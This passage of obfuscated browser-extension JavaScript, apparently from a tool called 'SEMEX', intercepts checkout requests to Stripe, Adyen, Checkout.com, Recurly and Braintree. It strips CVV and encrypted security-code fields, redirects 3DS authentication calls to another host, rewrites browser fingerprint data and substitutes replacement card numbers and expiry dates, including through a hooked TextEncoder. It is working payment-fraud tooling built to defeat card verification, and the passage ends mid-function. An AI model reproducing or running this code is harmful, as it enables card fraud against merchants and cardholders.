      const _0x39d093 = _0xcbe5a7.adyen.some(_0x5cdb65 => _0x40247c.includes(_0x5cdb65.toLowerCase()));
      if (_0x39d093) {
        return false;
      }
    }
    if (_0xcbe5a7.checkout && Array.isArray(_0xcbe5a7.checkout)) {
      const _0x46cd72 = _0xcbe5a7.checkout.some(_0x52f240 => _0x40247c.includes(_0x52f240.toLowerCase()));
      if (_0x46cd72) {
        return false;
      }
    }
    const _0x45c51a = _0x40247c.includes("api.stripe.com") && (_0x40247c.includes("/verify_challenge") || _0x40247c.includes("/payment_intents/") || _0x40247c.includes("/setup_intents/") || _0x40247c.includes("/payment_pages/") || _0x40247c.includes("/payment_methods") || _0x40247c.includes("/sources") || _0x40247c.includes("/tokens") || _0x40247c.includes("/confirm") || _0x40247c.includes("/confirm_payment") || _0x40247c.includes("/confirmation_tokens") || _0x40247c.includes("/completed_webhook_delivered") || _0x40247c.includes("/3ds2/authenticate"));
    if (_0x45c51a) {
      return true;
    }
    const _0x123a73 = _0x40247c.includes("adyen.com") && (_0x40247c.includes("/payments") || _0x40247c.includes("/payment")) || _0x40247c.includes("/payments/adyen") || _0x40247c.includes("/payment/adyen") || _0x40247c.includes("api.gog.com/v1/checkout") || _0x40247c.includes("cloud.boosteroid.com/api/v2/payments/adyen") || _0x40247c.includes("/adyen");
    if (_0x123a73) {
      return true;
    }
    const _0x299e49 = _0x40247c.includes("checkout.com") && _0x40247c.includes("/tokens");
    if (_0x299e49) {
      return true;
    }
    const _0x5e9743 = _0x40247c.includes("xsolla.com") || _0x40247c.includes("directpayment");
    if (_0x5e9743) {
      return true;
    }
    if (_0x40247c.includes("wc-ajax=checkout")) {
      return true;
    }
    if (_0x40247c.includes("/wp-admin/admin-ajax.php")) {
      return true;
    }
    // Whop: ONLY the checkout-session confirm call carries the payment result
    // (verified live 2026-10-12). Session GETs, calculate_breakdown,
    // confirmation_tokens and every other whop.com API call must stay out or
    // the parser sees non-final "open"/"pending" states as traffic.
    if (_0x40247c.includes("whop.com/api/v1/checkout_sessions/")) {
      // Terminal gate: confirm calls are results; every other checkout-session
      // call (session GETs also carry status "completed") must not fall through
      // to the session-rules paymentEndpoints matcher below.
      return _0x40247c.includes("/confirm");
    }
    if (_0x29b65c(_0x40247c)) {
      return true;
    }
    return false;
  }
  __name(_0x58db0a, "isPaymentEndpoint");
  function _0x29b65c(_0x23d2ad) {
    var _0x3cfc1f;
    var _0x4a0da6;
    var _0x47aa75;
    if (!_0x23d2ad) {
      return null;
    }
    if (_0x23d2ad.includes("api.stripe.com")) {
      return "stripe";
    }
    if (_0x23d2ad.includes("checkout.com")) {
      return "checkout";
    }
    if (_0x23d2ad.includes("xsolla.com")) {
      return "xsolla";
    }
    if (_0x23d2ad.includes("whop.com/api/v1/checkout_sessions/")) {
      return "whop";
    }
    const _0x3e6a4a = (_0x3cfc1f = window.SEMEX_SESSION_RULES) == null ? undefined : _0x3cfc1f.paymentTracking;
    if (_0x3e6a4a) {
      for (const [_0x583803, _0x47c743] of Object.entries(_0x3e6a4a)) {
        if ((_0x4a0da6 = _0x47c743.paymentEndpoints) == null ? undefined : _0x4a0da6.some(_0x26f583 => _0x23d2ad.includes(_0x26f583))) {
          return _0x583803;
        }
        if ((_0x47aa75 = _0x47c743.domains) == null ? undefined : _0x47aa75.some(_0x3535c2 => _0x23d2ad.includes(_0x3535c2))) {
          return _0x583803;
        }
      }
    }
    if (_0x23d2ad.includes("adyen.com") || _0x23d2ad.includes("/adyen")) {
      return "adyen";
    }
    if (_0x23d2ad.includes("recurly.com")) {
      return "recurly";
    }
    if (_0x23d2ad.includes("braintree-api.com") || _0x23d2ad.includes("braintreegateway.com") || _0x23d2ad.includes("client.bin.paypal.com")) {
      return "braintree";
    }
    return null;
  }
  __name(_0x29b65c, "detectGateway");
  function _0x3ccea3(_0x9b9731, _0x19238e) {
    var _0x2bec4d;
    var _0x175a4e;
    var _0x217300;
    var _0x410e2a;
    var _0x634cee;
    var _0xe68671;
    var _0xff68ec;
    var _0x3df774;
    var _0xc39f5d;
    var _0x3e18a9;
    var _0x477860;
    var _0x28f611;
    var _0x114c60;
    var _0x346f6e;
    var _0x17b872;
    var _0x50d55c;
    var _0x3cd090;
    var _0x16b597;
    var _0x9016b9;
    var _0x19995b;
    var _0x3b5147;
    var _0x1c2409;
    var _0x3bf4c9;
    var _0x144b60;
    var _0x4dbfb1;
    var _0x1433e1;
    var _0x26b1d9;
    var _0x419d02;
    const _0x41f6d6 = {
      stripe: ["/init", "/sources", "/list_payment", "/update_payment", "/analytics", "/consumers/sessions/lookup", "/hosted/"],
      adyen: ["/securedfields", "/complete", "/setup", "/analytics", "/binlookup", "/fingerprint", "/tokenize"],
      checkout: ["/card-metadata", "/flow-web", "/frames"]
    };
    let _0x53e27e = null;
    if (_0x9b9731.includes("api.stripe.com") || _0x9b9731.includes("checkout.stripe.com")) {
      _0x53e27e = "stripe";
    } else if (_0x9b9731.includes("adyen.com") || _0x9b9731.includes("/adyen")) {
      _0x53e27e = "adyen";
    } else if (_0x9b9731.includes("checkout.com")) {
      _0x53e27e = "checkout";
    }
    if (_0x53e27e && _0x41f6d6[_0x53e27e]) {
      const _0x12dc35 = _0x41f6d6[_0x53e27e].some(_0x3701ab => _0x9b9731.toLowerCase().includes(_0x3701ab.toLowerCase()));
      if (_0x12dc35) {
        return Promise.resolve({
          action: "NONE"
        });
      }
    }
    _0xf8ac0b("[SEMEX DEBUG Fetch] fetchBypassInstructions called for:", _0x9b9731);
    _0xf8ac0b("[SEMEX DEBUG Fetch] Session rules available:", !!window.SEMEX_SESSION_RULES);
    if (window.SEMEX_SESSION_RULES && window.SEMEX_SESSION_RULES.xhrBypass) {
      try {
        const _0x5aa5f9 = window.SEMEX_SESSION_RULES.xhrBypass;
        const _0x155dd4 = _0x29b65c(_0x9b9731);
        _0xf8ac0b("[SEMEX DEBUG Fetch] Detected gateway:", _0x155dd4);
        const _0x35a8f6 = window.SEMEX_SETTINGS || {};
        const _0x30c3ab = ((_0x2bec4d = _0x35a8f6.cvvBypass) == null ? undefined : _0x2bec4d.enabled) ?? false;
        const _0x2fc917 = ((_0x175a4e = _0x35a8f6.paymentUserAgentBypass) == null ? undefined : _0x175a4e.enabled) ?? false;
        const _0x5b4ed3 = ((_0x217300 = _0x35a8f6.stripeSecurityBypass) == null ? undefined : _0x217300.enabled) ?? false;
        const _0x105c8a = ((_0x410e2a = _0x35a8f6.threeDSBypass) == null ? undefined : _0x410e2a.enabled) ?? true;
        const _0x228289 = {
          stripe: _0x30c3ab && (((_0xe68671 = (_0x634cee = _0x35a8f6.cvvBypass) == null ? undefined : _0x634cee.gateways) == null ? undefined : _0xe68671.stripe) ?? true),
          adyen: _0x30c3ab && (((_0x3df774 = (_0xff68ec = _0x35a8f6.cvvBypass) == null ? undefined : _0xff68ec.gateways) == null ? undefined : _0x3df774.adyen) ?? false),
          checkout: _0x30c3ab && (((_0x3e18a9 = (_0xc39f5d = _0x35a8f6.cvvBypass) == null ? undefined : _0xc39f5d.gateways) == null ? undefined : _0x3e18a9.checkout) ?? false),
          recurly: _0x30c3ab && (((_0x28f611 = (_0x477860 = _0x35a8f6.cvvBypass) == null ? undefined : _0x477860.gateways) == null ? undefined : _0x28f611.recurly) ?? false)
        };
        const _0x44274a = {
          stripe: ((_0x114c60 = _0x35a8f6.cardReplacement) == null ? undefined : _0x114c60.enabled) && (((_0x17b872 = (_0x346f6e = _0x35a8f6.cardReplacement) == null ? undefined : _0x346f6e.gateways) == null ? undefined : _0x17b872.stripe) ?? false),
          adyen: ((_0x50d55c = _0x35a8f6.cardReplacement) == null ? undefined : _0x50d55c.enabled) && (((_0x16b597 = (_0x3cd090 = _0x35a8f6.cardReplacement) == null ? undefined : _0x3cd090.gateways) == null ? undefined : _0x16b597.adyen) ?? false),
          checkout: ((_0x9016b9 = _0x35a8f6.cardReplacement) == null ? undefined : _0x9016b9.enabled) && (((_0x3b5147 = (_0x19995b = _0x35a8f6.cardReplacement) == null ? undefined : _0x19995b.gateways) == null ? undefined : _0x3b5147.checkout) ?? false),
          recurly: ((_0x1c2409 = _0x35a8f6.cardReplacement) == null ? undefined : _0x1c2409.enabled) && (((_0x144b60 = (_0x3bf4c9 = _0x35a8f6.cardReplacement) == null ? undefined : _0x3bf4c9.gateways) == null ? undefined : _0x144b60.recurly) ?? false)
        };
        _0xf8ac0b("[SEMEX DEBUG Fetch] User settings - CVV bypass:", _0x228289[_0x155dd4], "Card replacement:", _0x44274a[_0x155dd4]);
        if (_0x155dd4 === "stripe" && _0x5aa5f9.stripe) {
          const _0x2bca87 = _0x5aa5f9.stripe;
          let _0x3fb161 = [];
          let _0x1097a9 = [];
          if (_0x228289.stripe && _0x2bca87.enabled) {
            if (!_0x48fa9e()) {
              _0x3fb161.push(...(_0x2bca87.targets || []));
              _0x1097a9.push("CVV");
            }
          }
          if (_0x2fc917 && _0x2bca87.pauTargets) {
            _0x3fb161.push(..._0x2bca87.pauTargets);
            _0x1097a9.push("PAU");
          }
          if (_0x5b4ed3 && _0x2bca87.securityEnabled && _0x2bca87.securityTargets) {
            const _0x1a6d13 = Object.values(_0x2bca87.securityTargets).flat();
            _0x3fb161.push(..._0x1a6d13);
            _0x1097a9.push("Security");
          }
          if (_0x228289.stripe && _0x2bca87.zipTargets && _0x2bca87.enabled) {
            _0x3fb161.push(..._0x2bca87.zipTargets);
          }
          if (_0x9b9731.includes("/3ds2/authenticate") && _0x105c8a && ((_0x4dbfb1 = _0x5aa5f9.stripe3ds) == null ? undefined : _0x4dbfb1.enabled)) {
            return Promise.resolve({
              action: "REPLACE_URL_ONLY",
              bypassTypes: ["3DS"],
              targetHost: _0x5aa5f9.stripe3ds.targetHost
            });
          }
          if (_0x3fb161.length === 0 && !_0x44274a.stripe) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Stripe - All bypasses OFF, skipping");
            return Promise.resolve({
              action: "NONE"
            });
          }
          return Promise.resolve({
            action: _0x2bca87.action || "REMOVE_FROM_URLENCODED",
            params: _0x3fb161,
            bypassTypes: _0x1097a9,
            cardReplacementParams: _0x44274a.stripe ? (_0x1433e1 = window.SEMEX_SESSION_RULES.cardReplacementParams) == null ? undefined : _0x1433e1.stripe : null
          });
        }
        if (_0x155dd4 === "adyen" && _0x5aa5f9.adyen) {
          const _0x2c4fb3 = ["/securedfields", "/complete", "/setup", "/analytics", "/binlookup", "/binLookup", "/fingerprint", "/paymentDetails", "/sessions/", "/tokenize"];
          const _0x4266cd = _0x9b9731.includes("/payments") || _0x9b9731.includes("/payment");
          const _0x817213 = !_0x4266cd && _0x2c4fb3.some(_0x462f4b => _0x9b9731.includes(_0x462f4b));
          if (_0x817213) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Adyen - Non-payment endpoint, skipping:", _0x9b9731);
            return Promise.resolve({
              action: "NONE"
            });
          }
          _0xf8ac0b("[SEMEX DEBUG Fetch] Adyen rules found:", _0x5aa5f9.adyen);
          if (!_0x228289.adyen) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Adyen CVV bypass is OFF in user settings, skipping");
            return Promise.resolve({
              action: "NONE"
            });
          }
          const _0x57a655 = _0x5aa5f9.adyen.enabled ? _0x5aa5f9.adyen.targets || [] : [];
          const _0x41d5aa = _0x57a655.length > 0 ? ["CVV"] : [];
          const _0x37ede9 = {
            action: "SMART_REMOVE_FIELDS",
            fieldsToRemove: _0x57a655,
            bypassTypes: _0x41d5aa,
            gateway: "adyen"
          };
          _0xf8ac0b("[SEMEX DEBUG Fetch] Returning Adyen CVV removal instructions:", _0x37ede9);
          return Promise.resolve(_0x37ede9);
        }
        if (_0x155dd4 === "checkout" && _0x5aa5f9.checkout) {
          if (!_0x9b9731.includes("/tokens")) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Checkout.com - Non-payment endpoint, skipping:", _0x9b9731);
            return Promise.resolve({
              action: "NONE"
            });
          }
          _semexNotifyCardReplacementOff("checkout");
          if (!_0x228289.checkout && !_0x44274a.checkout) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Checkout.com - All features OFF in user settings, skipping");
            return Promise.resolve({
              action: "NONE"
            });
          }
          const _0x28cb22 = _0x228289.checkout && _0x5aa5f9.checkout.enabled ? _0x5aa5f9.checkout.targets || [] : [];
          const _0x406a1f = _0x28cb22.map(_0x429b4c => [_0x429b4c]);
          const _0x3be4e8 = _0x406a1f.length > 0 ? ["CVV"] : [];
          return Promise.resolve({
            action: _0x5aa5f9.checkout.action || "REMOVE_FROM_JSON",
            params: _0x406a1f,
            bypassTypes: _0x3be4e8,
            cardReplacementParams: _0x44274a.checkout ? (_0x26b1d9 = window.SEMEX_SESSION_RULES.cardReplacementParams) == null ? undefined : _0x26b1d9.checkout : null
          });
        }
        if (_0x155dd4 === "recurly" && _0x5aa5f9.recurly) {
          _semexNotifyCardReplacementOff("recurly");
          if (!_0x228289.recurly && !_0x44274a.recurly) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Recurly - All features OFF in user settings, skipping");
            return Promise.resolve({
              action: "NONE"
            });
          }
          if (_0x5aa5f9.recurly.enabled) {
            return Promise.resolve({
              action: _0x5aa5f9.recurly.action || "BLANK_IN_URLENCODED",
              params: _0x228289.recurly ? _0x5aa5f9.recurly.targets || ["cvv"] : [],
              bypassTypes: _0x228289.recurly ? ["CVV"] : [],
              cardReplacementParams: _0x44274a.recurly ? (_0x419d02 = window.SEMEX_SESSION_RULES.cardReplacementParams) == null ? undefined : _0x419d02.recurly : null
            });
          }
        }
        // ── Braintree: session-rules-driven CVV removal and card replacement ──
        if (_0x155dd4 === "braintree" && _0x5aa5f9.braintree) {
          _semexNotifyCardReplacementOff("braintree");
          const _0xbtRule = _0x5aa5f9.braintree;
          const _0xbtCvvOn = _0x30c3ab && !!(((_0x35a8f6.cvvBypass || {}).gateways) || {}).braintree;
          const _0xbtCrOn = !!(_0x35a8f6.cardReplacement || {}).enabled && !!((_0x35a8f6.cardReplacement.gateways || {}).braintree);
          if (!_0xbtCvvOn && !_0xbtCrOn) {
            _0xf8ac0b("[SEMEX DEBUG Fetch] Braintree - All features OFF in user settings, skipping");
            return Promise.resolve({ action: "NONE" });
          }
          if (!_0xbtRule.enabled) {
            return Promise.resolve({ action: "NONE" });
          }
          const _0xbtCrParams = _0xbtCrOn
            ? ((window.SEMEX_SESSION_RULES.cardReplacementParams) || {}).braintree || null
            : null;
          return Promise.resolve({
            action: _0xbtRule.action || "BRAINTREE_GRAPHQL_REMOVE",
            cvvField: _0xbtRule.cvvField || "cvv",
            creditCardPaths: _0xbtRule.creditCardPaths || ["variables.input.creditCard", "creditCard"],
            urlEncodedTargets: _0xbtRule.urlEncodedTargets || ["credit_card[cvv]"],
            bypassTypes: _0xbtCvvOn ? ["CVV"] : [],
            cardReplacementParams: _0xbtCrParams
          });
        }
      } catch (_0x29e95f) {}
    } else {
      _0x5c07cd("[SEMEX DEBUG Fetch] Session rules NOT available - falling back to server call");
    }
    _0xf8ac0b("[SEMEX DEBUG Fetch] Falling back to server call with 2s timeout");
    return new Promise(_0x3eaf22 => {
      const _0x38deab = Math.random().toString(36).substring(7);
      const _0x1b19b2 = setTimeout(() => {
        _0x14c42b();
        _0x3eaf22({
          action: "NONE"
        });
      }, 2000);
      const _0x3f381c = __name(_0x20fc09 => {
        if (_0x20fc09.data.type === "SEMEX_INSTRUCTIONS_RECEIVED" && _0x20fc09.data.requestId === _0x38deab) {
          _0xf8ac0b("[SEMEX DEBUG Fetch] Server instructions received:", _0x20fc09.data.instructions);
          _0x14c42b();
          _0x3eaf22(_0x20fc09.data.instructions);
        }
      }, "listener");
      function _0x14c42b() {
        clearTimeout(_0x1b19b2);
        window.removeEventListener("message", _0x3f381c);
      }
      __name(_0x14c42b, "cleanup");
      window.addEventListener("message", _0x3f381c);
      window.postMessage({
        type: "SEMEX_FETCH_INSTRUCTIONS",
        url: _0x9b9731,
        method: _0x19238e,
        requestId: _0x38deab,
        gateway: _0x29b65c(_0x9b9731),
        isCheckout: _0x48fa9e()
      }, "*");
    });
  }
  __name(_0x3ccea3, "fetchBypassInstructions");
  function _0x48fa9e() {
    if (window.IS_STRIPE_CHECKOUT === true) {
      return true;
    }
    try {
      if (sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true") {
        return true;
      }
    } catch (_0x1dc614) {}
    const _0x141ce8 = window.location.pathname.toLowerCase();
    const _0x2c8a54 = window.location.hostname.toLowerCase();
    const _0x211a38 = ["checkout.stripe.com", "pay.openai.com", "buy.stripe.com", "donate.stripe.com", "invoice.stripe.com", "billing.stripe.com"];
    if (_0x211a38.includes(_0x2c8a54)) {
      return true;
    }
    const _0x3ae391 = ["checkout.", "pay.", "secure."];
    if (_0x3ae391.some(_0x4c91df => _0x2c8a54.startsWith(_0x4c91df))) {
      if (_0x141ce8.includes("/c/") || _0x141ce8.includes("/p/") || _0x141ce8.includes("/pay/")) {
        return true;
      }
    }
    return false;
  }
  __name(_0x48fa9e, "isCheckoutPage");
  function _0x26cf9e(_0x23b336, _0x49852d) {
    if (typeof _0x23b336 !== "string" || !_0x49852d) {
      return _0x23b336;
    }
    let _0x3a8f17 = _0x23b336;
    const _0x271b8f = __name(_0x37bd99 => _0x37bd99.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "escapeRegExp");
    _0x49852d.forEach(_0x37ae5a => {
      const _0xa6b68f = encodeURIComponent(_0x37ae5a);
      const _0x130dcc = _0x271b8f(_0x37ae5a);
      const _0x5b664e = _0x271b8f(_0xa6b68f);
      const _0x3bcff7 = [new RegExp("(^|&)" + _0x130dcc + "=[^&]*", "gi"), new RegExp("(^|&)" + _0x5b664e + "=[^&]*", "gi")];
      _0x3bcff7.forEach(_0x305ced => {
        _0x3a8f17 = _0x3a8f17.replace(_0x305ced, "");
      });
    });
    return _0x3a8f17.replace(/&+/g, "&").replace(/^&|&$/g, "");
  }
  __name(_0x26cf9e, "removeParamsFromURLEncoded");
  function _0x3d6c2f(_0x1d6155, _0x17a9bd, _0x35a30a) {
    if (typeof _0x1d6155 !== "string" || !_0x17a9bd || typeof _0x35a30a === "undefined" || _0x35a30a === null) {
      return _0x1d6155;
    }
    let _0x3ef15f = _0x1d6155;
    const _0x5d72df = __name(_0x21b358 => _0x21b358.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "escapeRegExp");
    _0x17a9bd.forEach(_0x32b048 => {
      const _0x4d6bb6 = encodeURIComponent(_0x32b048);
      const _0x53026e = _0x5d72df(_0x32b048);
      const _0x153ada = _0x5d72df(_0x4d6bb6);
      const _0x35ec82 = encodeURIComponent(_0x35a30a);
      const _0x23f9d2 = [{
        regex: new RegExp("(" + _0x53026e + ")=([^&]*)", "gi"),
        replacement: "$1=" + _0x35ec82
      }, {
        regex: new RegExp("(" + _0x153ada + ")=([^&]*)", "gi"),
        replacement: "$1=" + _0x35ec82
      }];
      _0x23f9d2.forEach(({
        regex: _0x168932,
        replacement: _0x524fc5
      }) => {
        _0x3ef15f = _0x3ef15f.replace(_0x168932, _0x524fc5);
      });
    });
    return _0x3ef15f;
  }
  __name(_0x3d6c2f, "replaceParamsInURLEncoded");
  function _0x1ffd58(_0x20f00f, _0x50ee59) {
    if (typeof _0x20f00f !== "string" || !_0x50ee59) {
      return false;
    }
    const _0x57691f = [];
    if (_0x50ee59.number) {
      _0x57691f.push(...(Array.isArray(_0x50ee59.number) ? _0x50ee59.number : [_0x50ee59.number]));
    }
    if (_0x50ee59.exp_month) {
      _0x57691f.push(...(Array.isArray(_0x50ee59.exp_month) ? _0x50ee59.exp_month : [_0x50ee59.exp_month]));
    }
    if (_0x50ee59.exp_year) {
      _0x57691f.push(...(Array.isArray(_0x50ee59.exp_year) ? _0x50ee59.exp_year : [_0x50ee59.exp_year]));
    }
    if (_0x50ee59.cvc) {
      _0x57691f.push(...(Array.isArray(_0x50ee59.cvc) ? _0x50ee59.cvc : [_0x50ee59.cvc]));
    }
    for (const _0x10f5e3 of _0x57691f) {
      const _0x32cfbb = encodeURIComponent(_0x10f5e3);
      if (_0x20f00f.includes(_0x10f5e3 + "=") || _0x20f00f.includes(_0x32cfbb + "=")) {
        return true;
      }
    }
    return false;
  }
  __name(_0x1ffd58, "hasCardParamsInPayload");
  function _0x1b51d9(_0x2cb6ac, _0x205df7) {
    if (typeof _0x2cb6ac !== "string" || !_0x205df7) {
      return _0x2cb6ac;
    }
    let _0x3b412a = _0x2cb6ac;
    _0x205df7.forEach(_0x59cf93 => {
      try {
        const _0xf2453e = new RegExp(_0x59cf93, "gi");
        _0x3b412a = _0x3b412a.replace(_0xf2453e, "");
      } catch (_0x1f45e1) {}
    });
    return _0x3b412a.replace(/,(\s*[}\]])/g, "$1");
  }
  __name(_0x1b51d9, "removeFieldsFromJson");
  function _0x30ea01(_0x5b794c, _0x131c46) {
    if (typeof _0x5b794c !== "string") {
      return _0x5b794c;
    }
    const _0x3769d8 = _0x131c46 == null ? undefined : _0x131c46.targetField;
    const _0x328d1f = _0x131c46 == null ? undefined : _0x131c46.targetValue;
    if (!_0x3769d8) {
      return _0x5b794c;
    }
    const _0x17ce2e = /(^|&)browser=([^&]*)/gi;
    return _0x5b794c.replace(_0x17ce2e, (_0x499d1a, _0x2c7301, _0x4c8e72) => {
      try {
        const _0x449ccc = decodeURIComponent(_0x4c8e72.replace(/\+/g, " "));
        const _0x4eb0c5 = JSON.parse(_0x449ccc);
        _0x4eb0c5[_0x3769d8] = _0x328d1f;
        const _0x25ffa4 = JSON.stringify(_0x4eb0c5);
        const _0x1c8d16 = encodeURIComponent(_0x25ffa4).replace(/%20/g, "+");
        return _0x2c7301 + "browser=" + _0x1c8d16;
      } catch (_0x5752e7) {
        return _0x499d1a;
      }
    });
  }
  __name(_0x30ea01, "applyBrowserParamBypass");
  function _0xb8b246(_0x1d116a, _0x3e5999) {
    _0xf8ac0b("[SEMEX DEBUG removeNestedField] Called with path:", _0x3e5999);
    if (!_0x1d116a || typeof _0x1d116a !== "object" || !Array.isArray(_0x3e5999) || _0x3e5999.length === 0) {
      _0x5c07cd("[SEMEX DEBUG removeNestedField] Invalid input - obj:", typeof _0x1d116a, "path:", _0x3e5999);
      return _0x1d116a;
    }
    const _0x4b3a1d = JSON.parse(JSON.stringify(_0x1d116a));
    let _0x477a04 = _0x4b3a1d;
    _0xf8ac0b("[SEMEX DEBUG removeNestedField] Starting traversal from root");
    for (let _0x4bb9a = 0; _0x4bb9a < _0x3e5999.length - 1; _0x4bb9a++) {
      const _0x4ccac1 = _0x3e5999[_0x4bb9a];
      if (_0x477a04[_0x4ccac1] && typeof _0x477a04[_0x4ccac1] === "object") {
        _0x477a04 = _0x477a04[_0x4ccac1];
      } else {
        return _0x4b3a1d;
      }
    }
    const _0x25e960 = _0x3e5999[_0x3e5999.length - 1];
    if (_0x477a04 && typeof _0x477a04 === "object" && _0x25e960 in _0x477a04) {
      delete _0x477a04[_0x25e960];
    } else {}
    return _0x4b3a1d;
  }
  __name(_0xb8b246, "removeNestedField");
  function _0x5a041b(_0x3d2be4, _0x5e2c6d, _0x37c5b8 = []) {
    if (_0x37c5b8.length === 0) {
      _0xf8ac0b("[SEMEX DEBUG findNestedFieldPath] Starting search for:", _0x5e2c6d);
    }
    if (!_0x3d2be4 || typeof _0x5e2c6d !== "string") {
      _0x5c07cd("[SEMEX DEBUG findNestedFieldPath] Invalid input");
      return null;
    }
    if (typeof _0x3d2be4 === "object" && _0x3d2be4 !== null) {
      if (Array.isArray(_0x3d2be4)) {
        for (let _0x19d24a = 0; _0x19d24a < _0x3d2be4.length; _0x19d24a++) {
          const _0x3d4241 = _0x37c5b8.concat([_0x19d24a]);
          const _0x334f53 = _0x5a041b(_0x3d2be4[_0x19d24a], _0x5e2c6d, _0x3d4241);
          if (_0x334f53) {
            return _0x334f53;
          }
        }
      } else {
        for (const _0x33eb0b in _0x3d2be4) {
          if (Object.prototype.hasOwnProperty.call(_0x3d2be4, _0x33eb0b)) {
            const _0x275ffc = _0x37c5b8.concat([_0x33eb0b]);
            if (_0x33eb0b === _0x5e2c6d) {
              _0xf8ac0b("[SEMEX DEBUG findNestedFieldPath] ✅ FOUND at path:", _0x275ffc);
              return _0x275ffc;
            }
            if (typeof _0x3d2be4[_0x33eb0b] === "object" && _0x3d2be4[_0x33eb0b] !== null) {
              const _0x23a3f2 = _0x5a041b(_0x3d2be4[_0x33eb0b], _0x5e2c6d, _0x275ffc);
              if (_0x23a3f2) {
                return _0x23a3f2;
              }
            }
          }
        }
      }
    }
    if (_0x37c5b8.length === 0) {
      _0x5c07cd("[SEMEX DEBUG findNestedFieldPath] ❌ NOT FOUND:", _0x5e2c6d);
    }
    return null;
  }
  __name(_0x5a041b, "findNestedFieldPath");
})();
__name(function initAdyenCardReplacement() {
  if (window.__ADYEN_TEXTENCODER_HOOKED) {
    return;
  }
  if (!window.TextEncoder || !window.TextEncoder.prototype || typeof window.TextEncoder.prototype.encode !== "function") {
    setTimeout(initAdyenCardReplacement, 100);
    return;
  }
  window.__ADYEN_TEXTENCODER_HOOKED = true;
  const _0x2e17c8 = 10000;
  function _0x16d88b() {
    const _0x1859cd = Date.now();
    try {
      let _0x1b34f1 = window;
      if (window.top && window.top !== window) {
        const _0x318d05 = window.top.__SEMEX_CACHED_CARD;
        _0x1b34f1 = window.top;
      }
      if (_0x1b34f1.__SEMEX_CACHED_CARD && _0x1859cd - (_0x1b34f1.__SEMEX_CACHED_CARD_TS || 0) < _0x2e17c8) {
        return _0x1b34f1.__SEMEX_CACHED_CARD;
      }
      const _0x376f70 = window.getCardForReplacement();
      if (_0x376f70) {
        _0x1b34f1.__SEMEX_CACHED_CARD = _0x376f70;
        _0x1b34f1.__SEMEX_CACHED_CARD_TS = _0x1859cd;
        return _0x376f70;
      }
      if (_0x1b34f1.__SEMEX_CACHED_CARD) {
        _0x1b34f1.__SEMEX_CACHED_CARD_TS = _0x1859cd;
        return _0x1b34f1.__SEMEX_CACHED_CARD;
      }
      return null;
    } catch (_0x39e80f) {
      if (window.__SEMEX_LOCAL_CARD && _0x1859cd - (window.__SEMEX_LOCAL_CARD_TS || 0) < _0x2e17c8) {
        return window.__SEMEX_LOCAL_CARD;
      }
      const _0xda6905 = window.getCardForReplacement();
      if (_0xda6905) {
        window.__SEMEX_LOCAL_CARD = _0xda6905;
        window.__SEMEX_LOCAL_CARD_TS = _0x1859cd;
        return _0xda6905;
      }
      if (window.__SEMEX_LOCAL_CARD) {
        window.__SEMEX_LOCAL_CARD_TS = _0x1859cd;
        return window.__SEMEX_LOCAL_CARD;
      }
      return null;
    }
  }
  __name(_0x16d88b, "getCachedReplacementCard");
  function _0x4c9043(_0x464bc6, _0x2ca865) {
    var _0x1b1b3b;
    var _0x46c6f7;
    var _0x18ed49;
    const _0x3c6df5 = window.SEMEX_SETTINGS || {};
    const _0x377dad = ((_0x1b1b3b = _0x3c6df5.cvvBypass) == null ? undefined : _0x1b1b3b.enabled) && ((_0x18ed49 = (_0x46c6f7 = _0x3c6df5.cvvBypass) == null ? undefined : _0x46c6f7.gateways) == null ? undefined : _0x18ed49.adyen);
    if (!_0x2ca865) {
      if (_0x377dad) {
        let _0xa0abb0 = _0x464bc6;
        const _0x37195f = {
          card: false,
          cvc: false
        };
        const _0x4f72df = _0xa0abb0;
        _0xa0abb0 = _0xa0abb0.replace(/,\s*"cvc"\s*:\s*"[^"]*"/g, "");
        _0xa0abb0 = _0xa0abb0.replace(/"cvc"\s*:\s*"[^"]*"(?=\s*[,}])/g, "");
        _0xa0abb0 = _0xa0abb0.replace(/,\s*"encryptedSecurityCode"\s*:\s*"[^"]*"/g, "");
        _0xa0abb0 = _0xa0abb0.replace(/"encryptedSecurityCode"\s*:\s*"[^"]*"(?=\s*[,}])/g, "");
        if (_0xa0abb0 !== _0x4f72df) {
          _0x37195f.cvc = true;
        }
        return {
          replaced: _0x37195f.cvc ? _0xa0abb0 : _0x464bc6,
          changes: _0x37195f
        };
      }
      return {
        replaced: _0x464bc6,
        changes: {
          card: false,
          cvc: false
        }
      };
    }
    const _0x4bfcfe = String(_0x2ca865.number || "").replace(/\D/g, "");
    const _0x474725 = String(_0x2ca865.exp_month || "").padStart(2, "0");
    const _0x63ebdc = String(_0x2ca865.exp_year || "");
    const _0x404fff = _0x63ebdc.length === 2 ? _0x63ebdc : _0x63ebdc.slice(-2);
    const _0x2f396e = _0x63ebdc.length === 4 ? _0x63ebdc : _0x63ebdc.length === 2 ? "20" + _0x63ebdc : _0x63ebdc;
    let _0x50d774 = _0x464bc6;
    const _0x303b36 = {
      card: false,
      expiry: false,
      cvc: false
    };
    if (_0x4bfcfe) {
      const _0xd96466 = _0x50d774;
      _0x50d774 = _0x50d774.replace(/"number"\s*:\s*"[^"]*"/g, "\"number\":\"" + _0x4bfcfe + "\"");
      _0x50d774 = _0x50d774.replace(/"cardNumber"\s*:\s*"[^"]*"/g, "\"cardNumber\":\"" + _0x4bfcfe + "\"");
      _0x50d774 = _0x50d774.replace(/"pan"\s*:\s*"[^"]*"/g, "\"pan\":\"" + _0x4bfcfe + "\"");
      if (_0x50d774 !== _0xd96466) {
        _0x303b36.card = true;
      }
    }
    if (_0x474725) {
      const _0x5f59ce = _0x50d774;
      _0x50d774 = _0x50d774.replace(/"(expiryMonth|expiry_month|expMonth)"\s*:\s*"?\d{1,2}"?/g, "\"$1\":\"" + _0x474725 + "\"");
      if (_0x50d774 !== _0x5f59ce) {
        _0x303b36.expiry = true;
      }
    }
    if (_0x2f396e) {
      const _0x4e5de3 = _0x50d774;
